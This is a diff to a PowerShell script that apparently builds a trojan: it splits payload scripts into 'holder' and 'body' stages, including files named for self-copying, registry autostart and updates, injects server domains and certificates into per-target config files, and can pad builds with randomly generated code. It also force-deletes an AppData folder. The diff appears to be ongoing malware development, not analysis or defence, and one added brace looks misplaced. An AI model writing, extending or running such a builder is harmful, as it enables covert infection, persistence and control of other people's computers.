@@ -52,6 +52,22 @@ if (-not [string]::IsNullOrEmpty($outPath))
         New-Item -Path $outPath  -ItemType Directory
     }
 }
+function Get-LocalHephaestusFolder {
+    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
+    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
+    return $hephaestusFolder
+}
+$outPath = Get-LocalHephaestusFolder
+if (-not (Test-Path $outPath )) {
+    New-Item -Path $outPath  -ItemType Directory
+}
+if (-not [string]::IsNullOrEmpty($outPath)) 
+{
+    Remove-Item -Path $outPath\* -Recurse -Force
+    if (-not (Test-Path $outPath )) {
+        New-Item -Path $outPath  -ItemType Directory
+    }
+}
 
 function Utf8NoBom {
     param (
@@ -243,6 +259,7 @@ function Make-Template {
         $template += @"
         `$xdata = @{
         _CERT
+    }
 "@
         $stringList = @()
         foreach ($domain in $server.domains) 
@@ -272,7 +289,7 @@ function Make-Template {
     $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
     $servStr = ($filteredObject | ConvertTo-Json)
     $template  = $template -replace "_SERVER", $servStr
-    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')
+    $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath "consts_$target.ps1")
 
     return $template
 }
@@ -282,24 +299,23 @@ function Make-Ps1Files {
 
     $allFiles = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
     
-    $baseFiles = @(
-        $allFiles | Where-Object { $_.Name -in @("consts.ps1", "utils.ps1") }
-    )
+    $baseFiles = @($allFiles | Where-Object { $_.Name -in @("utils.ps1")})
     
     $holderFiles = @(
-        $allFiles | Where-Object { $_.Name -in @("auto.ps1", "embeddings.ps1", "update.ps1") }
+        $allFiles | Where-Object { $_.Name -in @("consts_holder.ps1", "autocopy.ps1", "autoregistry.ps1", "embeddings.ps1", "update.ps1") }
     )
 
     $returnFiles = $baseFiles
 
     if ($target -eq "holder") {
         $returnFiles += $holderFiles
-        $returnFiles +=  $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
+        $returnFiles += $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
     }
 
     if ($target -eq "body") {
         $holderFileNames = $holderFiles.Name
-        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderFileNames -and $_.Name -notin @("holder.ps1") -and $_.Name -notin @("program.ps1")  }
+        $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
+        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderFileNames -and $_.Name -notin @("holder.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")  }
         $returnFiles +=  $allFiles | Where-Object { $_.Name -in @("program.ps1")}
     }
 
@@ -337,7 +353,8 @@ function BuldScript{
         $fileContent = GetUtfNoBom -file $file.FullName
         $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
-        $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_body.ps1', "`n`n"
+        $fileContent = $fileContent -replace '. ./consts_holder.ps1', "`n`n"
         if ($random -eq $true)
         {
             $joinedContent += Generate-RandomCode
